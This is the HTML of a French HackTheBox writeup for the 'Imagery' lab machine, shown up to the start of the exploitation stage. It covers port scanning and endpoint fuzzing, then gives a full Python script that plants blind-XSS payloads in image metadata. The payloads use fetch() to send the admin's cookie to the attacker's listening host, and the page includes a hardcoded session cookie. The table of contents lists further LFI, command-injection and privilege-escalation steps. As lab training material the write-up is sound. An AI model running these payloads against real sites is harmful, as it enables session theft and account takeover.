@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Imagery - HackTheBox Writeup | keyll0ger</title>
+<meta name="keywords" content="HTB, Linux, Medium">
+<meta name="description" content="Difficulté: Medium
+OS: Linux (Ubuntu)
+Release Date: 2025
+IP: 10.10.11.88
+Table des Matières Énumération Initial Foothold - Blind XSS LFI via Admin Panel RCE via ImageMagick User Flag - Privilege Escalation vers Mark Root - Exploitation de Charcol Flags Lessons Learned Énumération Nmap Scan Scan initial pour découvrir les ports ouverts :
+nmap -p- --min-rate 10000 -vv 10.10.11.88 Résultats :
+PORT STATE SERVICE 22/tcp open ssh 8000/tcp open http-alt Scan détaillé des services :">
+<meta name="author" content="keyll0ger">
+<link rel="canonical" href="https://keyll0ger.github.io/posts/imagery/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://keyll0ger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://keyll0ger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://keyll0ger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://keyll0ger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://keyll0ger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://keyll0ger.github.io/posts/imagery/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="Imagery - HackTheBox Writeup" />
+<meta property="og:description" content="Difficulté: Medium
+OS: Linux (Ubuntu)
+Release Date: 2025
+IP: 10.10.11.88
+Table des Matières Énumération Initial Foothold - Blind XSS LFI via Admin Panel RCE via ImageMagick User Flag - Privilege Escalation vers Mark Root - Exploitation de Charcol Flags Lessons Learned Énumération Nmap Scan Scan initial pour découvrir les ports ouverts :
+nmap -p- --min-rate 10000 -vv 10.10.11.88 Résultats :
+PORT STATE SERVICE 22/tcp open ssh 8000/tcp open http-alt Scan détaillé des services :" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keyll0ger.github.io/posts/imagery/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2026-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Imagery - HackTheBox Writeup"/>
+<meta name="twitter:description" content="Difficulté: Medium
+OS: Linux (Ubuntu)
+Release Date: 2025
+IP: 10.10.11.88
+Table des Matières Énumération Initial Foothold - Blind XSS LFI via Admin Panel RCE via ImageMagick User Flag - Privilege Escalation vers Mark Root - Exploitation de Charcol Flags Lessons Learned Énumération Nmap Scan Scan initial pour découvrir les ports ouverts :
+nmap -p- --min-rate 10000 -vv 10.10.11.88 Résultats :
+PORT STATE SERVICE 22/tcp open ssh 8000/tcp open http-alt Scan détaillé des services :"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://keyll0ger.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Imagery - HackTheBox Writeup",
+      "item": "https://keyll0ger.github.io/posts/imagery/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Imagery - HackTheBox Writeup",
+  "name": "Imagery - HackTheBox Writeup",
+  "description": "Difficulté: Medium\nOS: Linux (Ubuntu)\nRelease Date: 2025\nIP: 10.10.11.88\nTable des Matières Énumération Initial Foothold - Blind XSS LFI via Admin Panel RCE via ImageMagick User Flag - Privilege Escalation vers Mark Root - Exploitation de Charcol Flags Lessons Learned Énumération Nmap Scan Scan initial pour découvrir les ports ouverts :\nnmap -p- --min-rate 10000 -vv 10.10.11.88 Résultats :\nPORT STATE SERVICE 22/tcp open ssh 8000/tcp open http-alt Scan détaillé des services :",
+  "keywords": [
+    "HTB", "Linux", "Medium"
+  ],
+  "articleBody": " Difficulté: Medium\nOS: Linux (Ubuntu)\nRelease Date: 2025\nIP: 10.10.11.88\nTable des Matières Énumération Initial Foothold - Blind XSS LFI via Admin Panel RCE via ImageMagick User Flag - Privilege Escalation vers Mark Root - Exploitation de Charcol Flags Lessons Learned Énumération Nmap Scan Scan initial pour découvrir les ports ouverts :\nnmap -p- --min-rate 10000 -vv 10.10.11.88 Résultats :\nPORT STATE SERVICE 22/tcp open ssh 8000/tcp open http-alt Scan détaillé des services :\nnmap -p22,8000 -sC -sV -A -vv 10.10.11.88 Résultats :\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0) 8000/tcp open http Werkzeug httpd 3.1.3 (Python 3.12.7) |_http-server-header: Werkzeug/3.1.3 Python/3.12.7 |_http-title: Image Gallery Informations clés :\nSSH version récente (pas d’exploits connus) Application web Python avec Werkzeug (Framework Flask) Titre: “Image Gallery” Web Enumeration Reconnaissance de l’application :\nwhatweb http://10.10.11.88:8000 Résultats :\nEmail[support@imagery.com], Python[3.12.7], Werkzeug[3.1.3], Title[Image Gallery] Fuzzing des endpoints :\nffuf -u http://10.10.11.88:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt Endpoints découverts :\n/images - Status 401 (Unauthorized) /login - Status 405 (Method Not Allowed) /register - Status 405 (Method Not Allowed) /logout - Status 405 (Method Not Allowed) Fonctionnalités de l’application :\nGalerie d’images publique Upload d’images (Max 1MB, JPG/PNG/GIF/BMP/TIFF) Champs: Title, Description, Group Account ID assigné: 98838b9e Initial Foothold - Blind XSS Découverte de la Vulnérabilité L’application permet l’upload d’images avec des métadonnées (titre, description). Ces champs ne sont pas correctement sanitizés et peuvent contenir du JavaScript qui sera exécuté lorsque l’administrateur consulte les images uploadées.\nExploitation - Vol du Cookie Admin Script d’exploitation (BlindXSS.py) :\n#!/usr/bin/env python3 import requests import time TARGET = \"http://10.10.11.88:8000\" LHOST = \"10.10.16.3\" # Votre IP VPN SESSION_COOKIE = \".eJyrVkrJLC7ISaz0TFGyUrK0sDC2SLJMVdJRyiz2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCL61IqRYASVwuCQ.aUfgeg.LSC36FsqhGE44sqdrPrt4nSB1L4\" session = requests.Session() session.cookies.set('session', SESSION_COOKIE) # Payloads XSS pour voler le cookie xss_payloads = [ f'''",
+  "wordCount" : "3054",
+  "inLanguage": "en",
+  "datePublished": "2026-03-27T00:00:00Z",
+  "dateModified": "2026-03-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "keyll0ger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://keyll0ger.github.io/posts/imagery/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "keyll0ger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://keyll0ger.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://keyll0ger.github.io/" accesskey="h" title="keyll0ger (Alt + H)">keyll0ger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://keyll0ger.github.io/posts/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://keyll0ger.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://keyll0ger.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Imagery - HackTheBox Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-03-27 00:00:00 +0000 UTC'>March 27, 2026</span>&nbsp;·&nbsp;15 min&nbsp;·&nbsp;keyll0ger
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#table-des-mati%c3%a8res" aria-label="Table des Matières">Table des Matières</a></li>
+                <li>
+                    <a href="#%c3%a9num%c3%a9ration" aria-label="Énumération">Énumération</a><ul>
+                        
+                <li>
+                    <a href="#nmap-scan" aria-label="Nmap Scan">Nmap Scan</a></li>
+                <li>
+                    <a href="#web-enumeration" aria-label="Web Enumeration">Web Enumeration</a></li></ul>
+                </li>
+                <li>
+                    <a href="#initial-foothold---blind-xss" aria-label="Initial Foothold - Blind XSS">Initial Foothold - Blind XSS</a><ul>
+                        
+                <li>
+                    <a href="#d%c3%a9couverte-de-la-vuln%c3%a9rabilit%c3%a9" aria-label="Découverte de la Vulnérabilité">Découverte de la Vulnérabilité</a></li>
+                <li>
+                    <a href="#exploitation---vol-du-cookie-admin" aria-label="Exploitation - Vol du Cookie Admin">Exploitation - Vol du Cookie Admin</a></li></ul>
+                </li>
+                <li>
+                    <a href="#lfi-via-admin-panel" aria-label="LFI via Admin Panel">LFI via Admin Panel</a><ul>
+                        
+                <li>
+                    <a href="#d%c3%a9couverte-du-path-traversal" aria-label="Découverte du Path Traversal">Découverte du Path Traversal</a></li>
+                <li>
+                    <a href="#extraction-de-fichiers-sensibles" aria-label="Extraction de Fichiers Sensibles">Extraction de Fichiers Sensibles</a></li></ul>
+                </li>
+                <li>
+                    <a href="#rce-via-imagemagick" aria-label="RCE via ImageMagick">RCE via ImageMagick</a><ul>
+                        
+                <li>
+                    <a href="#vuln%c3%a9rabilit%c3%a9-command-injection" aria-label="Vulnérabilité Command Injection">Vulnérabilité Command Injection</a></li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a></li></ul>
+                </li>
+                <li>
+                    <a href="#user-flag---privilege-escalation-vers-mark" aria-label="User Flag - Privilege Escalation vers Mark">User Flag - Privilege Escalation vers Mark</a><ul>
+                        
+                <li>
+                    <a href="#d%c3%a9couverte-du-fichier-backup-aes" aria-label="Découverte du Fichier Backup AES">Découverte du Fichier Backup AES</a></li>
+                <li>
+                    <a href="#cracking-du-fichier-aes-crypt" aria-label="Cracking du Fichier AES-Crypt">Cracking du Fichier AES-Crypt</a></li>
+                <li>
+                    <a href="#analyse-du-backup-d%c3%a9crypt%c3%a9" aria-label="Analyse du Backup Décrypté">Analyse du Backup Décrypté</a></li>
+                <li>
+                    <a href="#pivot-vers-lutilisateur-mark" aria-label="Pivot vers l&rsquo;utilisateur Mark">Pivot vers l&rsquo;utilisateur Mark</a></li>
+                <li>
+                    <a href="#user-flag" aria-label="User Flag">User Flag</a></li></ul>
+                </li>
+                <li>
+                    <a href="#root---exploitation-de-charcol" aria-label="Root - Exploitation de Charcol">Root - Exploitation de Charcol</a><ul>
+                        
+                <li>
+                    <a href="#enum%c3%a9ration-des-privil%c3%a8ges-sudo" aria-label="Enumération des Privilèges Sudo">Enumération des Privilèges Sudo</a></li>
+                <li>
+                    <a href="#analyse-de-charcol" aria-label="Analyse de Charcol">Analyse de Charcol</a></li>
+                <li>
+                    <a href="#exploitation---reset-du-mot-de-passe" aria-label="Exploitation - Reset du Mot de Passe">Exploitation - Reset du Mot de Passe</a></li>
+                <li>
+                    <a href="#acc%c3%a8s-au-shell-interactif-charcol" aria-label="Accès au Shell Interactif Charcol">Accès au Shell Interactif Charcol</a></li>
+                <li>
+                    <a href="#analyse-de-la-commande-auto-add" aria-label="Analyse de la Commande auto add">Analyse de la Commande auto add</a></li>
+                <li>
+                    <a href="#exploitation---t%c3%a2che-cron-malveillante" aria-label="Exploitation - Tâche Cron Malveillante">Exploitation - Tâche Cron Malveillante</a></li>
+                <li>
+                    <a href="#obtention-du-shell-root" aria-label="Obtention du Shell Root">Obtention du Shell Root</a></li>
+                <li>
+                    <a href="#root-flag" aria-label="Root Flag">Root Flag</a></li></ul>
+                </li>
+                <li>
+                    <a href="#lessons-learned" aria-label="Lessons Learned">Lessons Learned</a><ul>
+                        
+                <li>
+                    <a href="#vuln%c3%a9rabilit%c3%a9s-exploit%c3%a9es---r%c3%a9sum%c3%a9" aria-label="Vulnérabilités Exploitées - Résumé">Vulnérabilités Exploitées - Résumé</a><ul>
+                        
+                <li>
+                    <a href="#1-blind-xss-cross-site-scripting" aria-label="1. Blind XSS (Cross-Site Scripting)">1. Blind XSS (Cross-Site Scripting)</a></li>
+                <li>
+                    <a href="#2-path-traversal--lfi-local-file-inclusion" aria-label="2. Path Traversal / LFI (Local File Inclusion)">2. Path Traversal / LFI (Local File Inclusion)</a></li>
+                <li>
+                    <a href="#3-weak-password-hashing-md5" aria-label="3. Weak Password Hashing (MD5)">3. Weak Password Hashing (MD5)</a></li>
+                <li>
+                    <a href="#4-command-injection-via-imagemagick" aria-label="4. Command Injection via ImageMagick">4. Command Injection via ImageMagick</a></li>
+                <li>
+                    <a href="#5-weak-encryption-password-aes-crypt" aria-label="5. Weak Encryption Password (AES-Crypt)">5. Weak Encryption Password (AES-Crypt)</a></li>
+                <li>
+                    <a href="#6-sudo-misconfiguration" aria-label="6. Sudo Misconfiguration">6. Sudo Misconfiguration</a></li>
+                <li>
+                    <a href="#7-weak-password-reset-mechanism" aria-label="7. Weak Password Reset Mechanism">7. Weak Password Reset Mechanism</a></li>
+                <li>
+                    <a href="#8-command-injection-via-cron-critique" aria-label="8. Command Injection via Cron (CRITIQUE)">8. Command Injection via Cron (CRITIQUE)</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#attack-chain-summary" aria-label="Attack Chain Summary">Attack Chain Summary</a></li>
+                <li>
+                    <a href="#outils-utilis%c3%a9s" aria-label="Outils Utilisés">Outils Utilisés</a><ul>
+                        
+                <li>
+                    <a href="#reconnaissance" aria-label="Reconnaissance">Reconnaissance</a></li>
+                <li>
+                    <a href="#exploitation-web" aria-label="Exploitation Web">Exploitation Web</a></li>
+                <li>
+                    <a href="#password-cracking" aria-label="Password Cracking">Password Cracking</a></li>
+                <li>
+                    <a href="#post-exploitation" aria-label="Post-Exploitation">Post-Exploitation</a></li>
+                <li>
+                    <a href="#scripts-personnalis%c3%a9s" aria-label="Scripts Personnalisés">Scripts Personnalisés</a></li></ul>
+                </li>
+                <li>
+                    <a href="#timeline-de-lexploitation" aria-label="Timeline de l&rsquo;Exploitation">Timeline de l&rsquo;Exploitation</a></li>
+                <li>
+                    <a href="#recommandations-de-s%c3%a9curit%c3%a9-prioritaires" aria-label="Recommandations de Sécurité Prioritaires">Recommandations de Sécurité Prioritaires</a><ul>
+                        
+                <li>
+                    <a href="#pour-les-d%c3%a9veloppeurs" aria-label="Pour les Développeurs">Pour les Développeurs</a></li>
+                <li>
+                    <a href="#pour-les-administrateurs-syst%c3%a8me" aria-label="Pour les Administrateurs Système">Pour les Administrateurs Système</a></li></ul>
+                </li>
+                <li>
+                    <a href="#r%c3%a9f%c3%a9rences" aria-label="Références">Références</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="https://www.hackthebox.com/storage/avatars/imagery.png" alt="Imagery Banner"  />
+</p>
+<p><strong>Difficulté:</strong> Medium<br>
+<strong>OS:</strong> Linux (Ubuntu)<br>
+<strong>Release Date:</strong> 2025<br>
+<strong>IP:</strong> 10.10.11.88</p>
+<hr>
+<h2 id="table-des-matières">Table des Matières<a hidden class="anchor" aria-hidden="true" href="#table-des-matières">#</a></h2>
+<ul>
+<li><a href="#%C3%A9num%C3%A9ration">Énumération</a></li>
+<li><a href="#initial-foothold---blind-xss">Initial Foothold - Blind XSS</a></li>
+<li><a href="#lfi-via-admin-panel">LFI via Admin Panel</a></li>
+<li><a href="#rce-via-imagemagick">RCE via ImageMagick</a></li>
+<li><a href="#user-flag---privilege-escalation-vers-mark">User Flag - Privilege Escalation vers Mark</a></li>
+<li><a href="#root---exploitation-de-charcol">Root - Exploitation de Charcol</a></li>
+<li><a href="#flags">Flags</a></li>
+<li><a href="#lessons-learned">Lessons Learned</a></li>
+</ul>
+<hr>
+<h2 id="énumération">Énumération<a hidden class="anchor" aria-hidden="true" href="#énumération">#</a></h2>
+<h3 id="nmap-scan">Nmap Scan<a hidden class="anchor" aria-hidden="true" href="#nmap-scan">#</a></h3>
+<p>Scan initial pour découvrir les ports ouverts :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#ae81ff">10000</span> -vv 10.10.11.88
+</span></span></code></pre></div><p><strong>Résultats :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>8000/tcp open  http-alt
+</span></span></code></pre></div><p>Scan détaillé des services :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p22,8000 -sC -sV -A -vv 10.10.11.88
+</span></span></code></pre></div><p><strong>Résultats :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
+</span></span><span style="display:flex;"><span>|_http-title: Image Gallery
+</span></span></code></pre></div><p><strong>Informations clés :</strong></p>
+<ul>
+<li>SSH version récente (pas d&rsquo;exploits connus)</li>
+<li>Application web Python avec Werkzeug (Framework Flask)</li>
+<li>Titre: &ldquo;Image Gallery&rdquo;</li>
+</ul>
+<h3 id="web-enumeration">Web Enumeration<a hidden class="anchor" aria-hidden="true" href="#web-enumeration">#</a></h3>
+<p><strong>Reconnaissance de l&rsquo;application :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://10.10.11.88:8000
+</span></span></code></pre></div><p><strong>Résultats :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Email[support@imagery.com], Python[3.12.7], Werkzeug[3.1.3], Title[Image Gallery]
+</span></span></code></pre></div><p><strong>Fuzzing des endpoints :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://10.10.11.88:8000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+</span></span></code></pre></div><p><strong>Endpoints découverts :</strong></p>
+<ul>
+<li><code>/images</code> - Status 401 (Unauthorized)</li>
+<li><code>/login</code> - Status 405 (Method Not Allowed)</li>
+<li><code>/register</code> - Status 405 (Method Not Allowed)</li>
+<li><code>/logout</code> - Status 405 (Method Not Allowed)</li>
+</ul>
+<p><strong>Fonctionnalités de l&rsquo;application :</strong></p>
+<ul>
+<li>Galerie d&rsquo;images publique</li>
+<li>Upload d&rsquo;images (Max 1MB, JPG/PNG/GIF/BMP/TIFF)</li>
+<li>Champs: Title, Description, Group</li>
+<li>Account ID assigné: <code>98838b9e</code></li>
+</ul>
+<hr>
+<h2 id="initial-foothold---blind-xss">Initial Foothold - Blind XSS<a hidden class="anchor" aria-hidden="true" href="#initial-foothold---blind-xss">#</a></h2>
+<h3 id="découverte-de-la-vulnérabilité">Découverte de la Vulnérabilité<a hidden class="anchor" aria-hidden="true" href="#découverte-de-la-vulnérabilité">#</a></h3>
+<p>L&rsquo;application permet l&rsquo;upload d&rsquo;images avec des métadonnées (titre, description). Ces champs ne sont pas correctement sanitizés et peuvent contenir du JavaScript qui sera exécuté lorsque l&rsquo;administrateur consulte les images uploadées.</p>
+<h3 id="exploitation---vol-du-cookie-admin">Exploitation - Vol du Cookie Admin<a hidden class="anchor" aria-hidden="true" href="#exploitation---vol-du-cookie-admin">#</a></h3>
+<p><strong>Script d&rsquo;exploitation (BlindXSS.py) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.10.11.88:8000&#34;</span>
+</span></span><span style="display:flex;"><span>LHOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.16.3&#34;</span>  <span style="color:#75715e"># Votre IP VPN</span>
+</span></span><span style="display:flex;"><span>SESSION_COOKIE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.eJyrVkrJLC7ISaz0TFGyUrK0sDC2SLJMVdJRyiz2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1DiBCL61IqRYASVwuCQ.aUfgeg.LSC36FsqhGE44sqdrPrt4nSB1L4&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>session<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>set(<span style="color:#e6db74">&#39;session&#39;</span>, SESSION_COOKIE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Payloads XSS pour voler le cookie</span>
+</span></span><span style="display:flex;"><span>xss_payloads <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;&lt;img src=x onerror=&#34;fetch(&#39;http://</span><span style="color:#e6db74">{</span>LHOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:8000/steal?c=&#39;+document.cookie)&#34;&gt;&#39;&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;&lt;script&gt;fetch(&#39;http://</span><span style="color:#e6db74">{</span>LHOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:8000/steal?c=&#39;+document.cookie)&lt;/script&gt;&#39;&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;&lt;svg onload=&#34;fetch(&#39;http://</span><span style="color:#e6db74">{</span>LHOST<span style="color:#e6db74">}</span><span style="color:#e6db74">:8000/steal?c=&#39;+document.cookie)&#34;&gt;&#39;&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Créer un GIF minimal</span>
+</span></span><span style="display:flex;"><span>gif_data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;GIF89a</span><span style="color:#ae81ff">\x01\x00\x01\x00\x00\xff\x00</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00</span><span style="color:#e6db74">;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/xss.gif&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write(gif_data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Upload avec XSS dans les métadonnées</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i, payload <span style="color:#f92672">in</span> enumerate(xss_payloads):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/xss.gif&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        files <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;file&#39;</span>: (<span style="color:#e6db74">&#39;xss.gif&#39;</span>, f, <span style="color:#e6db74">&#39;image/gif&#39;</span>)}
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;title&#39;</span>: payload,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;description&#39;</span>: payload,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#39;group_name&#39;</span>: <span style="color:#e6db74">&#39;My Images&#39;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>TARGET<span style="color:#e6db74">}</span><span style="color:#e6db74">/upload_image&#34;</span>, files<span style="color:#f92672">=</span>files, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Upload #</span><span style="color:#e6db74">{</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>r<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] Listener: python3 -m http.server 8000&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] Attends que l&#39;admin consulte la galerie...&#34;</span>)
+</span></span></code></pre></div><p><strong>Exécution :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Terminal 1 : Listener HTTP</span>
